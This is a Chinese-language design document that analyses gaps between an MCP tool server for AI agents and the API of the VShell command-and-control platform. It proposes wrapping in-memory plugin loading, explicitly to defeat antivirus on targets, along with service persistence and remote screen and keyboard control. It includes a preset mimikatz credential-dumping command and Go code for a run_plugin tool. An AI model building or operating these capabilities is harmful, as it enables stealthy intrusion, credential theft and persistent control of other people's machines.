# MCP 能力差距分析 —— 与 VShell 服务端 API 的对照

> 结论先行:**不是 VShell 少功能,是本 MCP 少封装。**
> VShell 是一个功能完整的内网渗透平台;本 MCP 目前只封装了其中"命令/文件/隧道/监听器"部分,
> 把**插件内存加载、服务持久化、屏幕控制**这三个最贴近实战的能力留在了外面。

- 分析对象:`v_shell 4.9.3`(web_port 8082)
- 分析方法:提取管理台前端 JS 中的全部 API 定义 + 对真实服务端做接口探测
- 本文所有接口规格均来自**实测**(见"证据"小节),非猜测

---

## 1. 覆盖度总览

| 能力域 | VShell 接口数 | MCP 已封装 | 覆盖率 | 评价 |
|--------|--------------|-----------|--------|------|
| 隧道 / 代理 | 8 | 8 | **100%** | ✅ 完整 |
| 文件管理 | 15 | 12 | 80% | 🟡 缺 3 个 |
| 监听器 | 8 | 6 | 75% | 🟡 缺 del/dellist |
| 客户端管理 | 6 | 2 | 33% | 🔴 缺 4 个 |
| **插件运行时** | **3** | **0** | **0%** | 🔴 **整类缺失** |
| **服务持久化** | **2** | **0** | **0%** | 🔴 **整类缺失** |
| **屏幕 / 截屏** | **2** | **0** | **0%** | 🔴 **整类缺失** |
| 其他(认证/设置/下载) | ~8 | 2 | — | 🟡 低优先级 |

按接口计:**VShell 业务接口约 55 个,MCP 封装 25 个,覆盖率约 45%。**

---

## 2. 高价值缺口(建议优先实现)

### 2.1 插件运行时 —— 内存加载(最高价值)

**为什么重要**:VShell 的 `plugins/` 目录是**内存加载平台**,自带 mimikatz / fscan / gost。
内存加载 = **不落盘**,在目标机有 Defender / 杀软时,这是能否用起来的分水岭。
当前 MCP 只能 `upload_file` + `execute_command`(落盘执行),能力上有代差。

**实测插件清单**(`POST /runner/list`,无参数):

```json
{"code":0,"message":"ok","result":[
  {"id":0,"name":"AddUser.dll"},
  {"id":1,"name":"fscan.x64.elf"},
  {"id":2,"name":"gost.x64.exe"},
  {"id":3,"name":"gost.x64.so"},
  {"id":4,"name":"mimikatz.x64.exe"}
],"type":"success"}
```

| 接口 | 方法 | 参数 | 说明 |
|------|------|------|------|
| `/runner/list` | POST | `{}` | 列出 plugins/ 目录内的插件 |
| `/runner/runplugin` | POST | `{id, pluginName, procArg}` | **内存加载并运行**(注意:是执行动作) |
| `/runner/upload` | POST (multipart) | `file` | 上传插件到 plugins/ |

前端表单schema(来自 `vD0xFOdFQ.js` / `vCmx9UE-E.js`):

```js
{ field:"id",         label:"选择客户端", component:"ApiSelect", required:true }
{ field:"pluginName", label:"选择插件",   component:"ApiSelect", required:true }
{ field:"procArg",    label:"参数",       component:"Input" }
// 前端预置: pluginName==="mimikatz.x64.exe" → procArg="privilege::Debug sekurlsa::logonpasswords exit"
```

支持的插件后缀(前端 accept):`exe / net / elf / dll / so / dylib`
前端说明:"使用**内存加载模式**运行"

**MCP 建议工具**:`list_plugins` / `run_plugin` / `upload_plugin`

---

### 2.2 服务持久化 —— 开机自启(第二价值)

**为什么重要**:解决"客户端进程挂了/机器重启后掉线,只能重新投递"的问题。
这是**现成能力**,只是没暴露。

| 接口 | 方法 | 参数 | 说明 |
|------|------|------|------|
| `/install/install` | POST | `{id, name, description}` | 把客户端注册为系统服务 |
| `/install/remove` | POST | `{id, name, description}` | 卸载服务 |

前端表单(来自 `vBG86JV9o.js`):

```js
{ field:"id",          label:"客户端",       required:true }
{ field:"name",        label:"安装服务名称", required:true }
{ field:"description", label:"服务描述",     required:true }
```

前端说明:"Windows 需要有管理员或添加服务的权限。Linux 需要 root 权限"

**MCP 建议工具**:`install_service` / `remove_service`

---

### 2.3 屏幕 / 截屏

| 接口 | 方法 | 参数 | 说明 |
|------|------|------|------|
| `/screenshot/get` | GET | `?id=<hostId>&quality=<big\|normal\|small>` | 单张截屏 |
| `/screen/ws` | WebSocket | `?id=<hostId>&quality=<...>&token=<JWT>` | 实时屏幕 + 键鼠控制 |

**实测 `/screenshot/get`**:

```
GET /api/screenshot/get?id=5&quality=normal
→ HTTP 200  {"code":-1,"message":"BitBlt failed","result":null,"type":"error"}
```
> `BitBlt failed` = 目标机当前无交互式桌面会话(无人登录/服务会话),属正常限制。

**`/screen/ws` 控制协议**(二进制帧 = JPEG 画面;文本帧 = JSON 指令,来自 `vl9djw6e1.js`):

| type | 含义 | 载荷 |
|------|------|------|
| 1 | 鼠标绝对移动 | `{absX, absY, canvasWidth, canvasHeight}` |
| 2 | 鼠标左键按下 | `{}` |
| 3 | 键盘按键 | `{keyCode}` |
| 4 | 鼠标右键(阻止默认菜单) | `{}` |
| 5 | 鼠标按下(延迟后) | `{}` |
| 6 | 鼠标释放 | `{}` |
| 7 | 滚轮 | `{direction:"up"\|"down", amount}` |
| 8 | 组合键 | `{key, modifiers:{ctrl,alt,shift,meta}}` |
| 10 | 关闭会话 | `{}` |

**MCP 建议工具**:`screenshot`(取单帧,建议返回 base64 图片)/ `screen_control`(WS,复杂度较高,可延后)

---

## 3. 中低价值缺口(补齐即完整)

### 3.1 客户端管理

| 接口 | 方法 | 参数 | 实测返回 |
|------|------|------|---------|
| `/client/editremark` | POST | `{id, remark}` | `{"code":-1,"message":"client ID not found"}`(id 不存在时) |
| `/client/delfile` | POST | `{id}` | 删除客户端文件 |
| `/client/delprocess` | POST | `{id}` | `{"code":0,"message":"delete success"}` |
| `/client/dellist` | POST | `{id}` | `{"code":0,"message":"delete success"}`(删记录) |

> ⚠️ 实测注意:`/client/delprocess` 与 `/client/dellist` 在 **id 不存在时也返回 success**,
> MCP 封装时应对"目标是否存在"做前置校验,避免误判。

**MCP 建议工具**:`set_host_remark` / `delete_host` / `kill_client_process`

### 3.2 监听器补充

| 接口 | 方法 | 参数 | 实测 |
|------|------|------|------|
| `/listener/start` | POST | `{id}` | `{"code":-1,"message":"not found"}` |
| `/listener/stop` | POST | `{id}` | `{"code":-1,"message":"not found"}` |
| `/listener/del` | POST | `{id}` | `{"code":0,"message":"delete success"}` |
| `/listener/dellist` | POST | `{id:[...]}` | `{"code":0,"message":"delete success"}` |

> 注:`start`/`stop` 已在近期版本补入 MCP;`del`/`dellist` 目前**故意不暴露**(有测试守护)。
> 若产品决定放开,接口如上。

### 3.3 文件补充

| 接口 | 方法 | 参数 |
|------|------|------|
| `/file/modifytime` | POST | `{id, path, target, time}` |
| `/file/downloadtooss` | POST | `{id, path, target}`(下载到 OSS) |
| `/file/downloadtobrowser` | GET | `?id=&target=`(MCP 已在 `download_file` 内部使用) |

### 3.4 设置类(低优先级)

| 接口 | 方法 | 参数 | 实测返回 |
|------|------|------|---------|
| `/setting/get` | POST | `{}` | `{"result":{"dingding_access_token":"","dingding_key_word":"","wx_key":""}}` |
| `/setting/edit` | POST | 同上字段 | — |

---

## 4. 建议的 Go 实现结构

沿用现有分层(`internal/vshell/*.go` + `internal/mcp/server.go`),建议新增:

```
internal/vshell/
  runner.go     ← ListPlugins / RunPlugin / UploadPlugin
  install.go    ← InstallService / RemoveService
  screen.go     ← Screenshot / ScreenWS(可选)
  clients.go    ← 扩展 EditClientRemark / DeleteClient / DeleteClientProcess
internal/mcp/
  server.go     ← 注册对应工具
```

参考现有 `clients.go` 的写法:请求结构体 + `Validate()` 本地前置校验 + `Call()`。
例如插件运行:

```go
type RunPluginRequest struct {
    ID         int    `json:"id"`
    PluginName string `json:"pluginName"`
    ProcArg    string `json:"procArg,omitempty"`
}

func (r *RunPluginRequest) Validate() error {
    if r.ID <= 0        { return fmt.Errorf("缺少 id(客户端 Id)") }
    if r.PluginName == "" { return fmt.Errorf("缺少 pluginName(见 list_plugins)") }
    return nil
}
```

**安全提示(重要)**:`run_plugin` 是**执行动作**,不是只读。工具描述里必须写明
"会在目标上执行插件(内存加载)",并建议标注 `destructiveHint: true`(与 `register_client` 一致)。

---

## 5. 优先级建议

| 优先级 | 项 | 理由 |
|--------|----|------|
| 🔴 P0 | `run_plugin` / `list_plugins` | 内存加载,直接决定"有杀软的目标能否拿下" |
| 🔴 P0 | `install_service` | 现成持久化,解决"重启掉线需重新投递" |
| 🟠 P1 | `screenshot` | 取证/确认目标状态,实现简单 |
| 🟠 P1 | `delete_host` / `kill_client_process` | 善后刚需(目前只能靠命令绕) |
| 🟡 P2 | `set_host_remark` / `upload_plugin` | 易用性 |
| 🟡 P2 | `screen_control` | 实现复杂,可延后 |
| 🟢 P3 | `setting_*` / `modifytime` | 低频 |

---

## 6. 附:本次发现的两处 MCP 行为注意点

1. **`/client/delprocess`、`/client/dellist`、`/listener/del` 对不存在的 id 也返回 success**
   → 封装时建议先校验目标存在性,或把 v_shell 的 message 原样透出。

2. **`/terminal/shell` 会长时间挂起**(实测三次调用均 ReadTimeout)
   → 如需封装"一次性命令执行",建议继续走现有的 `/terminal/ws` 方案,不要用 `/terminal/shell`。

---

## 7. 证据与复现

- 接口清单来源:管理台前端 chunk
  `vD0xFOdFQ.js`(runner)、`vBG86JV9o.js`(install)、`vl9djw6e1.js`(screen)、
  `vNpmal8v-.js`(file)、`vBWp-URsu.js`(client)、`vPNC64JSn.js`(screenshot)
- 服务端验证:v_shell 4.9.3 @ 127.0.0.1:8082,真实在线主机 1 台(Windows 7 / god.org 域成员)
- 所有"实测返回"均为本次抓取,未做推测
